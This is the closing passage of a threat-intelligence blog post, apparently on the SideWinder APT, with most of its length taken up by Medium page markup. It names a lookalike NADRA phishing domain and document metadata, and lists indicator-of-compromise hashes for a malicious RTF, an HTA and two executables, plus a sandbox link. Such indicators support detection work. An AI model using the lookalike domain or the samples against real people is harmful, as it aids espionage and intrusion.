alt="" class="bh mr qg c" width="700" height="721" loading="lazy" role="presentation"/></picture></div></div></figure><p id="366b" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">We have <a class="ag jw" href="http://www.nadra.gov.pk.d-dns.co" rel="noopener ugc nofollow" target="_blank">www.nadra.gov.pk.d-dns.co</a> cleary targetted.</p><p id="9348" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The nadra is the National Database of and Registration Authority.</p><p id="8c1a" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">If you check the metada of RTF, Rashid Memorial is the author of the document.</p><p id="3030" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”</p><h1 id="b8d4" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">IOCs</h1><p id="0510" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">File RTF:</p><p id="43cc" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="d710" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6</p><p id="e810" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">hta:</p><p id="18d8" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc</p><p id="3cfe" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Executables:</p><p id="5ec7" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)</p><p id="841f" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)</p><p id="3b71" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Sandbox execution:</p><div class="rs rt ru rv rw rx"><a href="https://app.any.run/tasks/779ba068-a9d5-490b-a1ec-7ebaa81e5d57?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="ry ab ce"><div class="rz ab cg dn dm sa"><h2 class="bf id jr z cr sb ct cu sc cw cy ib bk">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…</h2><div class="sd l"><h3 class="bf b jr z cr sb ct cu sc cw cy cm">Interactive malware hunting service. Any environments ready for live testing most type of threats. Without install…</h3></div><div class="se l"><p class="bf b ff z cr sb ct cu sc cw cy cm">app.any.run</p></div></div><div class="sf l"><div class="sg l sh si sj sf sk mr rx"></div></div></div></a></div><h1 id="e047" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">Credits:</h1><p id="054f" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">Thanks to Benjamin Piot for exchange about this cases !</p></div></div></div></div></section></div></div></article></div><div class="ab dn"><div class="du bh hh hi hj hk"><div class="sl sm ab jz"><div class="sd ab"><a class="sn ay an ap" href="https://medium.com/tag/threat-intelligence?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="so gs ei sp hm sq sr bf b bg z bk ss">Threat Intelligence</div></a></div><div class="sd ab"><a class="sn ay an ap" href="https://medium.com/tag/malware-analysis?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="so gs ei sp hm sq sr bf b bg z bk ss">Malware Analysis</div></a></div></div></div></div><div class="l"></div><footer class="st su sv sw sx ab q sy sz c"><div class="l ae"><div class="ab dn"><div class="du bh hh hi hj hk"><div class="ab ea ta"><div class="ab q li"><div class="tb l"><span class="l tc td te e d"><div class="ab q li lj"><div class="pw-multi-vote-icon gs lk ll lm ln"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---footer_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="lo ap lp lq lr ls an lt lu lv ln"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lw lx ly lz ma mb mc"><p class="bf b ff z cm"><span class="md">--</span></p></div></div></span><span class="l h g f tf tg"><div class="ab q li lj"><div class="pw-multi-vote-icon gs lk ll lm ln"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---footer_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="lo ap lp lq lr ls an lt lu lv ln"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lw lx ly lz ma mb mc"><p class="bf b ff z cm"><span class="md">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ap lo me mf ab q gt mg mh" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="mi"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ab q"><div class="rp l ce"><div><div class="bm" aria-hidden="false"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=---footer_actions--5bc1a7e7c84c---------------------bookmark_footer------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="cm mk" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="rp l ce"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="ag gt ai aj ak al am ms ao ap aq gg mt mu mh mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="th l"><div class="ab dn"><div class="du bh hh hi hj hk"><div class="ab ti tj tk jy jx"><div class="tl tm tn to tp tq tr ts tt tu ab ea"><div class="h k"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------"><div class="l gs"><img alt="Sebdraven" class="l gm by jk jj ei" src="https://miro.medium.com/v2/resize:fill:96:96/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="48" height="48" loading="lazy"/><div class="gz by l jk jj ha n ay tv"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------"><div class="l gs"><img alt="Sebdraven" class="l gm by tw tx ei" src="https://miro.medium.com/v2/resize:fill:128:128/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="64" height="64" loading="lazy"/><div class="gz by l tw tx ha n ay tv"></div></div></a></div><div class="j i d ty ce"><div class="ab"><span><button class="bf b bg z tz so ua ub uc ud ue ge gf uf ug uh gj gk gl gm bm gn go">Follow</button></span></div></div></div><div class="ab cg dm"><div class="ui uj uk ra qz l"><a class="ag ah ai ak al am an ao ap aq ar as at au ab q" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------"><h2 class="pw-author-name bf um un uo up uq ur us pb ut uu pf uv uw pj ux uy bk"><span class="hv ul">Written by <!-- -->Sebdraven</span></h2></a><div class="sd ab ji"><div class="l ce"><span class="pw-follower-count bf b bg z cm"><a class="ag ah ai aj ak al am an ao ap aq ar as jt" rel="noopener follow" href="/followers?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------">543 Followers</a></span></div><div class="bf b bg z cm ab uz"><span class="ju l" aria-hidden="true"><span class="bf b bg z cm">·</span></span><a class="ag ah ai aj ak al am an ao ap aq ar as jt" rel="noopener follow" href="/following?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------">18 Following</a></div></div><div class="va l"><p class="bf b bg z bk"><span class="hv">Malwarist,Threat Huntist and pythonist / core dev of #yeti/ member of @ProjectHoneynet / co-organizer #BotConf / researcher</span></p></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z tz so ua ub uc ud ue ge gf uf ug uh gj gk gl gm bm gn go">Follow</button></span></div></div></div></div></div></div><div class="vb l"><div class="vc bh r th"></div><div class="ab dn"><div class="du bh hh hi hj hk"><div class="ab q ea"><h2 class="bf um nn np nq nr nt nu nv nx ny nz ob oc od of og bk">No responses yet</h2><div class="ab vd"><div><div class="bm" aria-hidden="false"><a class="ve vf" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--5bc1a7e7c84c---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="vg vh vi vj vk l"></div></div></div></div><div class="vl vm vn vo vp l bx"><div class="h k j"><div class="vc bh vq vr"></div><div class="ab dn"><div class="du bh hh hi hj hk"><div class="cf ab li jz"><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://help.medium.com/hc/en-us?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Help</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://medium.statuspage.io/?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Status</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://medium.com/about?autoplay=1&amp;source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">About</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Careers</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bf b ff z cm">Press</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://blog.medium.com/?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Blog</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Privacy</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Rules</p></a></div><div class="vs vt l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Terms</p></a></div><div class="vs l"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" href="https://speechify.com/medium?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bf b ff z cm">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250328-182323-a35ba23afb"</script><script>window.__GRAPHQL_URI__ = "https://sebdraven.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-5bc1a7e7c84c","user-11d98531eebe"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"pubFeaturingPostPageLabelEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":true,"routingEntity":{"type":"USER","id":"11d98531eebe","explicit":true},"viewerIsBot":false},"debug":{"requestId":"fc03c2c9-a061-44f3-af23-b88e961aa655","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-180b3aae711c14f84a5e06202018f8a2-5f657a54624621f9-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","host":"sebdraven.medium.com","hostname":"sebdraven.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250328-182323-a35ba23afb","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250328-182323-a35ba23afb","commit":"a35ba23afb450fd5d99131880ff71e440f487582"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"8